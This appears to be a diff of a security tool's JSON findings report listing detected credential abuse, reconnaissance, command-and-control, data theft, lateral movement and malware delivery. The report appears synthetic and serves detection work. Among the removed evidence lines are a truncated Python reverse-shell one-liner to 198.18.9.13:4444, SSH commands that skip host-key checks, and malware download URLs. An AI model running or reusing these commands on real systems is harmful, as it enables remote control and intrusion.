@@ -3,92 +3,12 @@
  "findings": [
   {
    "category": "Credential abuse",
-   "timestamp": "2026-10-15T17:11:57.999Z",
-   "host": "WS-1514",
-   "user": "frank58",
-   "process": "sso",
-   "evidence": [
-    "15 SSO fails from 198.18.91.1 then success at 2026-10-15T17:41:52.752Z"
-   ]
-  },
-  {
-   "category": "Credential abuse",
-   "timestamp": "2026-10-13T05:43:22.854Z",
-   "host": "WS-2313",
-   "user": "yvonne88",
-   "process": "sso",
-   "evidence": [
-    "24 SSO fails from 198.18.91.10 then success at 2026-10-13T06:13:22.187Z"
-   ]
-  },
-  {
-   "category": "Credential abuse",
-   "timestamp": "2026-10-13T07:16:46.325Z",
-   "host": "WS-5084",
-   "user": "nina195",
-   "process": "sso",
-   "evidence": [
-    "22 SSO fails from 198.18.91.2 then success at 2026-10-13T07:46:44.916Z"
-   ]
-  },
-  {
-   "category": "Credential abuse",
-   "timestamp": "2026-10-16T11:11:17.941Z",
-   "host": "WS-1154",
-   "user": "jack44",
-   "process": "sso",
-   "evidence": [
-    "27 SSO fails from 198.18.91.3 then success at 2026-10-16T11:41:13.537Z"
-   ]
-  },
-  {
-   "category": "Credential abuse",
    "timestamp": "2026-10-14T13:21:21.690Z",
    "host": "WS-3823",
    "user": "alice147",
    "process": "sso",
    "evidence": [
-    "14 SSO fails from 198.18.91.4 then success at 2026-10-14T13:51:19.526Z"
-   ]
-  },
-  {
-   "category": "Credential abuse",
-   "timestamp": "2026-10-16T10:49:43.605Z",
-   "host": "WS-4352",
-   "user": "jack167",
-   "process": "sso",
-   "evidence": [
-    "26 SSO fails from 198.18.91.5 then success at 2026-10-16T11:19:39.294Z"
-   ]
-  },
-  {
-   "category": "Credential abuse",
-   "timestamp": "2026-10-14T19:26:21.568Z",
-   "host": "WS-0824",
-   "user": "rachel31",
-   "process": "sso",
-   "evidence": [
-    "14 SSO fails from 198.18.91.6 then success at 2026-10-14T19:56:19.476Z"
-   ]
-  },
-  {
-   "category": "Credential abuse",
-   "timestamp": "2026-10-15T17:52:24.672Z",
-   "host": "WS-9117",
-   "user": "quinn350",
-   "process": "sso",
-   "evidence": [
-    "13 SSO fails from 198.18.91.7 then success at 2026-10-15T18:22:16.575Z"
-   ]
-  },
-  {
-   "category": "Credential abuse",
-   "timestamp": "2026-10-14T14:20:19.115Z",
-   "host": "WS-4227",
-   "user": "omar162",
-   "process": "sso",
-   "evidence": [
-    "13 SSO fails from 198.18.91.8 then success at 2026-10-14T14:50:15.985Z"
+    "14 sso fails from 198.18.91.4 in 30 min, then success at 2026-10-14T13:51:19.526Z"
    ]
   },
   {
@@ -98,7 +18,367 @@
    "user": "carol318",
    "process": "sso",
    "evidence": [
-    "18 SSO fails from 198.18.91.9 then success at 2026-10-15T05:06:52.521Z"
+    "18 sso fails from 198.18.91.9 in 30 min, then success at 2026-10-15T05:06:52.521Z"
+   ]
+  },
+  {
+   "category": "Credential abuse",
+   "timestamp": "2026-10-15T17:11:57.999Z",
+   "host": "WS-1514",
+   "user": "frank58",
+   "process": "sso",
+   "evidence": [
+    "15 sso fails from 198.18.91.1 in 30 min, then success at 2026-10-15T17:41:52.752Z"
+   ]
+  },
+  {
+   "category": "Credential abuse",
+   "timestamp": "2026-10-16T10:49:43.605Z",
+   "host": "WS-4352",
+   "user": "jack167",
+   "process": "sso",
+   "evidence": [
+    "26 sso fails from 198.18.91.5 in 30 min, then success at 2026-10-16T11:19:39.294Z"
+   ]
+  },
+  {
+   "category": "Credential abuse",
+   "timestamp": "2026-10-16T11:11:17.941Z",
+   "host": "WS-1154",
+   "user": "jack44",
+   "process": "sso",
+   "evidence": [
+    "27 sso fails from 198.18.91.3 in 30 min, then success at 2026-10-16T11:41:13.537Z"
+   ]
+  },
+  {
+   "category": "Credential abuse",
+   "timestamp": "2026-10-13T07:16:46.325Z",
+   "host": "WS-5084",
+   "user": "nina195",
+   "process": "sso",
+   "evidence": [
+    "22 sso fails from 198.18.91.2 in 30 min, then success at 2026-10-13T07:46:44.916Z"
+   ]
+  },
+  {
+   "category": "Credential abuse",
+   "timestamp": "2026-10-14T14:20:19.115Z",
+   "host": "WS-4227",
+   "user": "omar162",
+   "process": "sso",
+   "evidence": [
+    "13 sso fails from 198.18.91.8 in 30 min, then success at 2026-10-14T14:50:15.985Z"
+   ]
+  },
+  {
+   "category": "Credential abuse",
+   "timestamp": "2026-10-15T17:52:24.672Z",
+   "host": "WS-9117",
+   "user": "quinn350",
+   "process": "sso",
+   "evidence": [
+    "13 sso fails from 198.18.91.7 in 30 min, then success at 2026-10-15T18:22:16.575Z"
+   ]
+  },
+  {
+   "category": "Credential abuse",
+   "timestamp": "2026-10-14T19:26:21.568Z",
+   "host": "WS-0824",
+   "user": "rachel31",
+   "process": "sso",
+   "evidence": [
+    "14 sso fails from 198.18.91.6 in 30 min, then success at 2026-10-14T19:56:19.476Z"
+   ]
+  },
+  {
+   "category": "Credential abuse",
+   "timestamp": "2026-10-13T05:43:22.854Z",
+   "host": "WS-2313",
+   "user": "yvonne88",
+   "process": "sso",
+   "evidence": [
+    "24 sso fails from 198.18.91.10 in 30 min, then success at 2026-10-13T06:13:22.187Z"
+   ]
+  },
+  {
+   "category": "Reconnaissance",
+   "timestamp": "2026-10-13T01:20:22.970Z",
+   "host": "WS-5696",
+   "user": "bob219",
+   "process": "ldapsearch",
+   "evidence": [
+    "33 wildcard LDAP searches"
+   ]
+  },
+  {
+   "category": "Reconnaissance",
+   "timestamp": "2026-10-13T04:06:14.815Z",
+   "host": "WS-4925",
+   "user": "karen189",
+   "process": "ldapsearch",
+   "evidence": [
+    "26 wildcard LDAP searches"
+   ]
+  },
+  {
+   "category": "Reconnaissance",
+   "timestamp": "2026-10-13T20:52:10.161Z",
+   "host": "WS-4475",
+   "user": "carol172",
+   "process": "ldapsearch",
+   "evidence": [
+    "30 wildcard LDAP searches"
+   ]
+  },
+  {
+   "category": "Reconnaissance",
+   "timestamp": "2026-10-14T22:13:05.517Z",
+   "host": "WS-1887",
+   "user": "omar72",
+   "process": "ldapsearch",
+   "evidence": [
+    "31 wildcard LDAP searches"
+   ]
+  },
+  {
+   "category": "Reconnaissance",
+   "timestamp": "2026-10-15T03:35:35.425Z",
+   "host": "WS-8794",
+   "user": "frank338",
+   "process": "ldapsearch",
+   "evidence": [
+    "31 wildcard LDAP searches"
+   ]
+  },
+  {
+   "category": "Reconnaissance",
+   "timestamp": "2026-10-15T14:54:26.358Z",
+   "host": "WS-0283",
+   "user": "wendy10",
+   "process": "ldapsearch",
+   "evidence": [
+    "16 wildcard LDAP searches"
+   ]
+  },
+  {
+   "category": "Reconnaissance",
+   "timestamp": "2026-10-15T16:08:43.889Z",
+   "host": "WS-6974",
+   "user": "frank268",
+   "process": "ldapsearch",
+   "evidence": [
+    "22 wildcard LDAP searches"
+   ]
+  },
+  {
+   "category": "Reconnaissance",
+   "timestamp": "2026-10-16T08:58:38.247Z",
+   "host": "WS-1662",
+   "user": "xavier63",
+   "process": "ldapsearch",
+   "evidence": [
+    "29 wildcard LDAP searches"
+   ]
+  },
+  {
+   "category": "Command and control",
+   "timestamp": "2026-10-12T15:30:33.410Z",
+   "host": "WS-7030",
+   "user": "jack270",
+   "process": "sync_helper",
+   "evidence": [
+    "8 threat-intel-block denials 10.1.27.117 -> 198.18.70.10"
+   ]
+  },
+  {
+   "category": "Command and control",
+   "timestamp": "2026-10-13T07:25:12.775Z",
+   "host": "WS-5626",
+   "user": "jack216",
+   "process": "sync_helper",
+   "evidence": [
+    "8 threat-intel-block denials 10.1.21.249 -> 198.18.70.9"
+   ]
+  },
+  {
+   "category": "Command and control",
+   "timestamp": "2026-10-13T11:56:37.701Z",
+   "host": "WS-9650",
+   "user": "dave371",
+   "process": "sync_helper",
+   "evidence": [
+    "8 threat-intel-block denials 10.1.37.177 -> 198.18.70.4"
+   ]
+  },
+  {
+   "category": "Command and control",
+   "timestamp": "2026-10-13T13:01:11.739Z",
+   "host": "WS-1438",
+   "user": "henry55",
+   "process": "sync_helper",
+   "evidence": [
+    "8 threat-intel-block denials 10.1.5.157 -> 198.18.70.4"
+   ]
+  },
+  {
+   "category": "Command and control",
+   "timestamp": "2026-10-13T13:46:53.276Z",
+   "host": "WS-8355",
+   "user": "irene321",
+   "process": "sync_helper",
+   "evidence": [
+    "8 threat-intel-block denials 10.1.32.162 -> 198.18.70.13"
+   ]
+  },
+  {
+   "category": "Command and control",
+   "timestamp": "2026-10-13T14:24:20.808Z",
+   "host": "WS-2204",
+   "user": "tina84",
+   "process": "sync_helper",
+   "evidence": [
+    "8 threat-intel-block denials 10.1.8.155 -> 198.18.70.7"
+   ]
+  },
+  {
+   "category": "Command and control",
+   "timestamp": "2026-10-14T05:34:07.350Z",
+   "host": "WS-5265",
+   "user": "mia202",
+   "process": "sync_helper",
+   "evidence": [
+    "8 threat-intel-block denials 10.1.20.144 -> 198.18.70.6"
+   ]
+  },
+  {
+   "category": "Command and control",
+   "timestamp": "2026-10-14T12:48:36.742Z",
+   "host": "WS-7525",
+   "user": "karen289",
+   "process": "sync_helper",
+   "evidence": [
+    "8 threat-intel-block denials 10.1.29.100 -> 198.18.70.4"
+   ]
+  },
+  {
+   "category": "Command and control",
+   "timestamp": "2026-10-14T16:58:24.865Z",
+   "host": "WS-5182",
+   "user": "henry199",
+   "process": "sync_helper",
+   "evidence": [
+    "8 threat-intel-block denials 10.1.20.61 -> 198.18.70.4"
+   ]
+  },
+  {
+   "category": "Command and control",
+   "timestamp": "2026-10-15T09:24:08.186Z",
+   "host": "WS-1953",
+   "user": "carol75",
+   "process": "sync_helper",
+   "evidence": [
+    "8 threat-intel-block denials 10.4.1.109 -> 198.18.70.8"
+   ]
+  },
+  {
+   "category": "Command and control",
+   "timestamp": "2026-10-15T17:53:28.536Z",
+   "host": "WS-6484",
+   "user": "jack249",
+   "process": "sync_helper",
+   "evidence": [
+    "8 threat-intel-block denials 10.3.4.139 -> 198.18.70.11"
+   ]
+  },
+  {
+   "category": "Command and control",
+   "timestamp": "2026-10-16T02:32:17.824Z",
+   "host": "WS-7105",
+   "user": "grace273",
+   "process": "sync_helper",
+   "evidence": [
+    "8 threat-intel-block denials 10.1.27.192 -> 198.18.70.12"
+   ]
+  },
+  {
+   "category": "Data theft",
+   "timestamp": "2026-10-12T02:32:27.081Z",
+   "host": "WS-6458",
+   "user": "jack248",
+   "process": "vpn",
+   "evidence": [
+    "VPN from 203.0.113.197: 1.60 GB up vs 0.35 GB down"
+   ]
+  },
+  {
+   "category": "Data theft",
+   "timestamp": "2026-10-13T01:30:30.804Z",
+   "host": "WS-0127",
+   "user": "wendy4",
+   "process": "vpn",
+   "evidence": [
+    "VPN from 203.0.113.180: 2.16 GB up vs 0.13 GB down"
+   ]
+  },
+  {
+   "category": "Data theft",
+   "timestamp": "2026-10-13T04:33:03.030Z",
+   "host": "WS-5120",
+   "user": "xavier196",
+   "process": "vpn",
+   "evidence": [
+    "VPN from 203.0.113.188: 2.37 GB up vs 0.18 GB down"
+   ]
+  },
+  {
+   "category": "Data theft",
+   "timestamp": "2026-10-14T00:38:11.597Z",
+   "host": "WS-5025",
+   "user": "grace193",
+   "process": "vpn",
+   "evidence": [
+    "VPN from 203.0.113.19: 1.98 GB up vs 0.23 GB down"
+   ]
+  },
+  {
+   "category": "Data theft",
+   "timestamp": "2026-10-15T02:37:57.401Z",
+   "host": "WS-8952",
+   "user": "henry344",
+   "process": "vpn",
+   "evidence": [
+    "VPN from 203.0.113.78: 0.41 GB up vs 0.09 GB down"
+   ]
+  },
+  {
+   "category": "Data theft",
+   "timestamp": "2026-10-15T04:08:21.433Z",
+   "host": "WS-2727",
+   "user": "wendy104",
+   "process": "vpn",
+   "evidence": [
+    "VPN from 203.0.113.180: 1.38 GB up vs 0.36 GB down"
+   ]
+  },
+  {
+   "category": "Data theft",
+   "timestamp": "2026-10-16T00:39:16.601Z",
+   "host": "WS-3022",
+   "user": "frank116",
+   "process": "vpn",
+   "evidence": [
+    "VPN from 203.0.113.149: 0.47 GB up vs 0.27 GB down"
+   ]
+  },
+  {
+   "category": "Data theft",
+   "timestamp": "2026-10-16T03:08:26.400Z",
+   "host": "WS-2324",
+   "user": "jack89",
+   "process": "vpn",
+   "evidence": [
+    "VPN from 203.0.113.53: 1.73 GB up vs 0.32 GB down"
    ]
   },
   {
@@ -108,7 +388,7 @@
    "user": "dave119",
    "process": "sso",
    "evidence": [
-    "spray from 198.18.77.9: 24 users failed, then dave119 got in at 2026-10-13T02:03:00.836Z"
+    "spray burst from 198.18.77.9: 24 users failed, then dave119 got in at 2026-10-13T02:03:00.836Z"
    ]
   },
   {
@@ -118,7 +398,7 @@
    "user": "bob209",
    "process": "sso",
    "evidence": [
-    "spray from 198.18.77.9: 16 users failed, then bob209 got in at 2026-10-13T12:06:02.270Z"
+    "spray burst from 198.18.77.9: 16 users failed, then bob209 got in at 2026-10-13T12:06:02.270Z"
    ]
   },
   {
@@ -128,7 +408,7 @@
    "user": "dave360",
    "process": "sso",
    "evidence": [
-    "spray from 198.18.77.9: 20 users failed, then dave360 got in at 2026-10-14T05:42:36.582Z"
+    "spray burst from 198.18.77.9: 20 users failed, then dave360 got in at 2026-10-14T05:42:36.582Z"
    ]
   },
   {
@@ -138,7 +418,7 @@
    "user": "leo46",
    "process": "sso",
    "evidence": [
-    "spray from 198.18.77.9: 12 users failed, then leo46 got in at 2026-10-14T15:04:50.019Z"
+    "spray burst from 198.18.77.9: 12 users failed, then leo46 got in at 2026-10-14T15:04:50.019Z"
    ]
   },
   {
@@ -148,7 +428,7 @@
    "user": "leo3",
    "process": "sso",
    "evidence": [
-    "spray from 198.18.77.9: 26 users failed, then leo3 got in at 2026-10-14T16:21:48.973Z"
+    "spray burst from 198.18.77.9: 26 users failed, then leo3 got in at 2026-10-14T16:21:48.973Z"
    ]
   },
   {
@@ -158,7 +438,7 @@
    "user": "bob128",
    "process": "sso",
    "evidence": [
-    "spray from 198.18.77.9: 15 users failed, then bob128 got in at 2026-10-14T20:03:18.549Z"
+    "spray burst from 198.18.77.9: 15 users failed, then bob128 got in at 2026-10-14T20:03:18.549Z"
    ]
   },
   {
@@ -168,7 +448,7 @@
    "user": "jack209",
    "process": "sso",
    "evidence": [
-    "spray from 198.18.77.9: 30 users failed, then jack209 got in at 2026-10-15T05:14:05.995Z"
+    "spray burst from 198.18.77.9: 30 users failed, then jack209 got in at 2026-10-15T05:14:05.995Z"
    ]
   },
   {
@@ -178,7 +458,7 @@
    "user": "henry337",
    "process": "sso",
    "evidence": [
-    "spray from 198.18.77.9: 21 users failed, then henry337 got in at 2026-10-15T10:23:51.647Z"
+    "spray burst from 198.18.77.9: 21 users failed, then henry337 got in at 2026-10-15T10:23:51.647Z"
    ]
   },
   {
@@ -188,7 +468,7 @@
    "user": "nina176",
    "process": "sso",
    "evidence": [
-    "spray from 198.18.77.9: 34 users failed, then nina176 got in at 2026-10-15T23:27:08.358Z"
+    "spray burst from 198.18.77.9: 34 users failed, then nina176 got in at 2026-10-15T23:27:08.358Z"
    ]
   },
   {
@@ -198,7 +478,7 @@
    "user": "tina16",
    "process": "sso",
    "evidence": [
-    "spray from 198.18.77.9: 25 users failed, then tina16 got in at 2026-10-16T08:30:46.968Z"
+    "spray burst from 198.18.77.9: 25 users failed, then tina16 got in at 2026-10-16T08:30:46.968Z"
    ]
   },
   {
@@ -492,376 +772,6 @@
    ]
   },
   {
-   "category": "Reconnaissance",
-   "timestamp": "2026-10-13T01:20:22.970Z",
-   "host": "WS-5696",
-   "user": "bob219",
-   "process": "ldapsearch",
-   "evidence": [
-    "33 wildcard LDAP searches"
-   ]
-  },
-  {
-   "category": "Reconnaissance",
-   "timestamp": "2026-10-13T04:06:14.815Z",
-   "host": "WS-4925",
-   "user": "karen189",
-   "process": "ldapsearch",
-   "evidence": [
-    "26 wildcard LDAP searches"
-   ]
-  },
-  {
-   "category": "Reconnaissance",
-   "timestamp": "2026-10-13T20:52:10.161Z",
-   "host": "WS-4475",
-   "user": "carol172",
-   "process": "ldapsearch",
-   "evidence": [
-    "30 wildcard LDAP searches"
-   ]
-  },
-  {
-   "category": "Reconnaissance",
-   "timestamp": "2026-10-14T22:13:05.517Z",
-   "host": "WS-1887",
-   "user": "omar72",
-   "process": "ldapsearch",
-   "evidence": [
-    "31 wildcard LDAP searches"
-   ]
-  },
-  {
-   "category": "Reconnaissance",
-   "timestamp": "2026-10-15T03:35:35.425Z",
-   "host": "WS-8794",
-   "user": "frank338",
-   "process": "ldapsearch",
-   "evidence": [
-    "31 wildcard LDAP searches"
-   ]
-  },
-  {
-   "category": "Reconnaissance",
-   "timestamp": "2026-10-15T14:54:26.358Z",
-   "host": "WS-0283",
-   "user": "wendy10",
-   "process": "ldapsearch",
-   "evidence": [
-    "16 wildcard LDAP searches"
-   ]
-  },
-  {
-   "category": "Reconnaissance",
-   "timestamp": "2026-10-15T16:08:43.889Z",
-   "host": "WS-6974",
-   "user": "frank268",
-   "process": "ldapsearch",
-   "evidence": [
-    "22 wildcard LDAP searches"
-   ]
-  },
-  {
-   "category": "Reconnaissance",
-   "timestamp": "2026-10-16T08:58:38.247Z",
-   "host": "WS-1662",
-   "user": "xavier63",
-   "process": "ldapsearch",
-   "evidence": [
-    "29 wildcard LDAP searches"
-   ]
-  },
-  {
-   "category": "Reconnaissance",
-   "timestamp": "2026-10-13T04:31:53.050Z",
-   "host": "WS-9637",
-   "user": "quinn370",
-   "process": "masscan",
-   "evidence": [
-    "24 server ip:port pairs probed by masscan"
-   ]
-  },
-  {
-   "category": "Reconnaissance",
-   "timestamp": "2026-10-14T00:02:53.678Z",
-   "host": "WS-9056",
-   "user": "henry348",
-   "process": "python3",
-   "evidence": [
-    "10 server ip:port pairs probed by python3"
-   ]
-  },
-  {
-   "category": "Reconnaissance",
-   "timestamp": "2026-10-14T05:15:28.899Z",
-   "host": "WS-3074",
-   "user": "frank118",
-   "process": "python3",
-   "evidence": [
-    "10 server ip:port pairs probed by python3"
-   ]
-  },
-  {
-   "category": "Reconnaissance",
-   "timestamp": "2026-10-14T06:57:10.171Z",
-   "host": "WS-2504",
-   "user": "henry96",
-   "process": "masscan",
-   "evidence": [
-    "17 server ip:port pairs probed by masscan"
-   ]
-  },
-  {
-   "category": "Reconnaissance",
-   "timestamp": "2026-10-14T10:18:48.262Z",
-   "host": "WS-5464",
-   "user": "dave210",
-   "process": "python3",
-   "evidence": [
-    "10 server ip:port pairs probed by python3"
-   ]
-  },
-  {
-   "category": "Reconnaissance",
-   "timestamp": "2026-10-14T10:46:09.011Z",
-   "host": "WS-9063",
-   "user": "omar348",
-   "process": "python3",
-   "evidence": [
-    "10 server ip:port pairs probed by python3"
-   ]
-  },
-  {
-   "category": "Reconnaissance",
-   "timestamp": "2026-10-14T14:01:35.728Z",
-   "host": "WS-5615",
-   "user": "yvonne215",
-   "process": "masscan",
-   "evidence": [
-    "26 server ip:port pairs probed by masscan"
-   ]
-  },
-  {
-   "category": "Reconnaissance",
-   "timestamp": "2026-10-14T14:04:58.271Z",
-   "host": "WS-0159",
-   "user": "carol6",
-   "process": "python3",
-   "evidence": [
-    "10 server ip:port pairs probed by python3"
-   ]
-  },
-  {
-   "category": "Command and control",
-   "timestamp": "2026-10-12T15:30:33.410Z",
-   "host": "WS-7030",
-   "user": "jack270",
-   "process": "sync_helper",
-   "evidence": [
-    "8 threat-intel-block denials 10.1.27.117 -> 198.18.70.10"
-   ]
-  },
-  {
-   "category": "Command and control",
-   "timestamp": "2026-10-13T07:25:12.775Z",
-   "host": "WS-5626",
-   "user": "jack216",
-   "process": "sync_helper",
-   "evidence": [
-    "8 threat-intel-block denials 10.1.21.249 -> 198.18.70.9"
-   ]
-  },
-  {
-   "category": "Command and control",
-   "timestamp": "2026-10-13T11:56:37.701Z",
-   "host": "WS-9650",
-   "user": "dave371",
-   "process": "sync_helper",
-   "evidence": [
-    "8 threat-intel-block denials 10.1.37.177 -> 198.18.70.4"
-   ]
-  },
-  {
-   "category": "Command and control",
-   "timestamp": "2026-10-13T13:01:11.739Z",
-   "host": "WS-1438",
-   "user": "henry55",
-   "process": "sync_helper",
-   "evidence": [
-    "8 threat-intel-block denials 10.1.5.157 -> 198.18.70.4"
-   ]
-  },
-  {
-   "category": "Command and control",
-   "timestamp": "2026-10-13T13:46:53.276Z",
-   "host": "WS-8355",
-   "user": "irene321",
-   "process": "sync_helper",
-   "evidence": [
-    "8 threat-intel-block denials 10.1.32.162 -> 198.18.70.13"
-   ]
-  },
-  {
-   "category": "Command and control",
-   "timestamp": "2026-10-13T14:24:20.808Z",
-   "host": "WS-2204",
-   "user": "tina84",
-   "process": "sync_helper",
-   "evidence": [
-    "8 threat-intel-block denials 10.1.8.155 -> 198.18.70.7"
-   ]
-  },
-  {
-   "category": "Command and control",
-   "timestamp": "2026-10-14T05:34:07.350Z",
-   "host": "WS-5265",
-   "user": "mia202",
-   "process": "sync_helper",
-   "evidence": [
-    "8 threat-intel-block denials 10.1.20.144 -> 198.18.70.6"
-   ]
-  },
-  {
-   "category": "Command and control",
-   "timestamp": "2026-10-14T12:48:36.742Z",
-   "host": "WS-7525",
-   "user": "karen289",
-   "process": "sync_helper",
-   "evidence": [
-    "8 threat-intel-block denials 10.1.29.100 -> 198.18.70.4"
-   ]
-  },
-  {
-   "category": "Command and control",
-   "timestamp": "2026-10-14T16:58:24.865Z",
-   "host": "WS-5182",
-   "user": "henry199",
-   "process": "sync_helper",
-   "evidence": [
-    "8 threat-intel-block denials 10.1.20.61 -> 198.18.70.4"
-   ]
-  },
-  {
-   "category": "Command and control",
-   "timestamp": "2026-10-15T09:24:08.186Z",
-   "host": "WS-1953",
-   "user": "carol75",
-   "process": "sync_helper",
-   "evidence": [
-    "8 threat-intel-block denials 10.4.1.109 -> 198.18.70.8"
-   ]
-  },
-  {
-   "category": "Command and control",
-   "timestamp": "2026-10-15T17:53:28.536Z",
-   "host": "WS-6484",
-   "user": "jack249",
-   "process": "sync_helper",
-   "evidence": [
-    "8 threat-intel-block denials 10.3.4.139 -> 198.18.70.11"
-   ]
-  },
-  {
-   "category": "Command and control",
-   "timestamp": "2026-10-16T02:32:17.824Z",
-   "host": "WS-7105",
-   "user": "grace273",
-   "process": "sync_helper",
-   "evidence": [
-    "8 threat-intel-block denials 10.1.27.192 -> 198.18.70.12"
-   ]
-  },
-  {
-   "category": "Command and control",
-   "timestamp": "2026-10-16T02:16:26.308Z",
-   "host": "WS-9116",
-   "user": "paula350",
-   "process": "bash",
-   "evidence": [
-    "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"198.18.9.13\",4444));os.dup2(s.fileno(),0);os.dup2("
-   ]
-  },
-  {
-   "category": "Data theft",
-   "timestamp": "2026-10-12T02:32:27.081Z",
-   "host": "WS-6458",
-   "user": "jack248",
-   "process": "vpn",
-   "evidence": [
-    "VPN from 203.0.113.197: 1.60 GB up vs 0.35 GB down"
-   ]
-  },
-  {
-   "category": "Data theft",
-   "timestamp": "2026-10-13T01:30:30.804Z",
-   "host": "WS-0127",
-   "user": "wendy4",
-   "process": "vpn",
-   "evidence": [
-    "VPN from 203.0.113.180: 2.16 GB up vs 0.13 GB down"
-   ]
-  },
-  {
-   "category": "Data theft",
-   "timestamp": "2026-10-13T04:33:03.030Z",
-   "host": "WS-5120",
-   "user": "xavier196",
-   "process": "vpn",
-   "evidence": [
-    "VPN from 203.0.113.188: 2.37 GB up vs 0.18 GB down"
-   ]
-  },
-  {
-   "category": "Data theft",
-   "timestamp": "2026-10-14T00:38:11.597Z",
-   "host": "WS-5025",
-   "user": "grace193",
-   "process": "vpn",
-   "evidence": [
-    "VPN from 203.0.113.19: 1.98 GB up vs 0.23 GB down"
-   ]
-  },
-  {
-   "category": "Data theft",
-   "timestamp": "2026-10-15T02:37:57.401Z",
-   "host": "WS-8952",
-   "user": "henry344",
-   "process": "vpn",
-   "evidence": [
-    "VPN from 203.0.113.78: 0.41 GB up vs 0.09 GB down"
-   ]
-  },
-  {
-   "category": "Data theft",
-   "timestamp": "2026-10-15T04:08:21.433Z",
-   "host": "WS-2727",
-   "user": "wendy104",
-   "process": "vpn",
-   "evidence": [
-    "VPN from 203.0.113.180: 1.38 GB up vs 0.36 GB down"
-   ]
-  },
-  {
-   "category": "Data theft",
-   "timestamp": "2026-10-16T00:39:16.601Z",
-   "host": "WS-3022",
-   "user": "frank116",
-   "process": "vpn",
-   "evidence": [
-    "VPN from 203.0.113.149: 0.47 GB up vs 0.27 GB down"
-   ]
-  },
-  {
-   "category": "Data theft",
-   "timestamp": "2026-10-16T03:08:26.400Z",
-   "host": "WS-2324",
-   "user": "jack89",
-   "process": "vpn",
-   "evidence": [
-    "VPN from 203.0.113.53: 1.73 GB up vs 0.32 GB down"
-   ]
-  },
-  {
    "category": "Lateral movement",
    "timestamp": "2026-10-12T12:44:01.713Z",
    "host": "WS-2877",
@@ -1083,46 +993,6 @@
   },
   {
    "category": "Lateral movement",
-   "timestamp": "2026-10-13T14:32:51.097Z",
-   "host": "WS-7986",
-   "user": "dave307",
-   "process": "bash",
-   "evidence": [
-    "ssh -o StrictHostKeyChecking=no admin-1@10.2.0.13"
-   ]
-  },
-  {
-   "category": "Lateral movement",
-   "timestamp": "2026-10-14T09:18:38.312Z",
-   "host": "WS-6342",
-   "user": "xavier243",
-   "process": "bash",
-   "evidence": [
-    "ssh -o StrictHostKeyChecking=no admin-3@10.2.0.23"
-   ]
-  },
-  {
-   "category": "Lateral movement",
-   "timestamp": "2026-10-15T14:26:54.984Z",
-   "host": "WS-3055",
-   "user": "mia117",
-   "process": "bash",
-   "evidence": [
-    "ssh -o StrictHostKeyChecking=no admin-2@10.2.0.18"
-   ]
-  },
-  {
-   "category": "Lateral movement",
-   "timestamp": "2026-10-15T16:07:27.393Z",
-   "host": "WS-7716",
-   "user": "tina296",
-   "process": "bash",
-   "evidence": [
-    "ssh -o StrictHostKeyChecking=no admin-5@10.2.0.31"
-   ]
-  },
-  {
-   "category": "Lateral movement",
    "timestamp": "2026-10-13T10:31:17.488Z",
    "host": "WS-6312",
    "user": "tina242",
@@ -1222,163 +1092,233 @@
    ]
   },
   {
-   "category": "Malware delivery",
-   "timestamp": "2026-10-12T16:36:50.362Z",
-   "host": "WS-0512",
-   "user": "rachel19",
-   "process": "updater",
+   "category": "Reconnaissance",
+   "timestamp": "2026-10-14T00:02:53.678Z",
+   "host": "WS-9056",
+   "user": "henry348",
+   "process": "python3",
    "evidence": [
-    "updates.nexusos-patch.com/v2/manifest (48 requests; files: /v2/manifest)"
+    "10 server ip:port pairs probed by python3 over 45 min"
    ]
   },
   {
-   "category": "Malware delivery",
-   "timestamp": "2026-10-12T22:34:37.776Z",
-   "host": "WS-9604",
-   "user": "jack369",
-   "process": "chrome",
+   "category": "Reconnaissance",
+   "timestamp": "2026-10-14T05:15:28.899Z",
+   "host": "WS-3074",
+   "user": "frank118",
+   "process": "python3",
    "evidence": [
-    "dl.freewarevault.net/files/doc.scr (2 requests; files: /files/doc.scr)"
+    "10 server ip:port pairs probed by python3 over 45 min"
    ]
   },
   {
-   "category": "Malware delivery",
-   "timestamp": "2026-10-13T01:57:13.931Z",
-   "host": "WS-3764",
-   "user": "tina144",
-   "process": "chrome",
+   "category": "Reconnaissance",
+   "timestamp": "2026-10-14T10:18:48.262Z",
+   "host": "WS-5464",
+   "user": "dave210",
+   "process": "python3",
    "evidence": [
-    "cdn.installer-bundle.net/dl/loader.exe (2 requests; files: /dl/loader.exe,/dl/stage2.dll)"
+    "10 server ip:port pairs probed by python3 over 45 min"
    ]
   },
   {
-   "category": "Malware delivery",
-   "timestamp": "2026-10-13T04:25:27.525Z",
-   "host": "WS-1244",
-   "user": "victor47",
-   "process": "chrome",
+   "category": "Reconnaissance",
+   "timestamp": "2026-10-14T10:46:09.011Z",
+   "host": "WS-9063",
+   "user": "omar348",
+   "process": "python3",
    "evidence": [
-    "cdn.installer-bundle.net/dl/loader.exe (2 requests; files: /dl/loader.exe,/dl/stage2.dll)"
+    "10 server ip:port pairs probed by python3 over 45 min"
    ]
   },
   {
-   "category": "Malware delivery",
-   "timestamp": "2026-10-13T07:38:33.173Z",
-   "host": "WS-4190",
-   "user": "dave161",
-   "process": "updater",
+   "category": "Reconnaissance",
+   "timestamp": "2026-10-14T14:04:58.271Z",
+   "host": "WS-0159",
+   "user": "carol6",
+   "process": "python3",
    "evidence": [
-    "updates.nexusos-patch.com/v2/manifest (49 requests; files: /v2/manifest)"
+    "10 server ip:port pairs probed by python3 over 45 min"
    ]
   },
   {
-   "category": "Malware delivery",
-   "timestamp": "2026-10-13T10:31:36.820Z",
-   "host": "LAB-02",
-   "user": "labuser4",
-   "process": "chrome",
+   "category": "Credential abuse",
+   "timestamp": "2026-10-14T21:08:57.146Z",
+   "host": "WS-4551",
+   "user": "alice175",
+   "process": "vpn",
    "evidence": [
-    "updates.driversoft-portal.net/files/patch.hta (2 requests; files: /files/patch.hta)"
+    "VPN from 203.0.113.163 then 198.18.88.14 at 2026-10-14T22:02:18.372Z"
    ]
   },
   {
-   "category": "Malware delivery",
-   "timestamp": "2026-10-13T14:29:23.758Z",
-   "host": "WS-7203",
-   "user": "alice277",
-   "process": "updater",
+   "category": "Credential abuse",
+   "timestamp": "2026-10-12T16:58:22.074Z",
+   "host": "WS-1458",
+   "user": "bob56",
+   "process": "vpn",
    "evidence": [
-    "updates.nexusos-patch.com/v2/manifest (48 requests; files: /v2/manifest)"
+    "VPN from 203.0.113.70 then 198.18.88.11 at 2026-10-12T17:47:44.218Z"
    ]
   },
   {
-   "category": "Malware delivery",
-   "timestamp": "2026-10-13T15:56:17.211Z",
-   "host": "WS-9503",
-   "user": "mia365",
-   "process": "firefox",
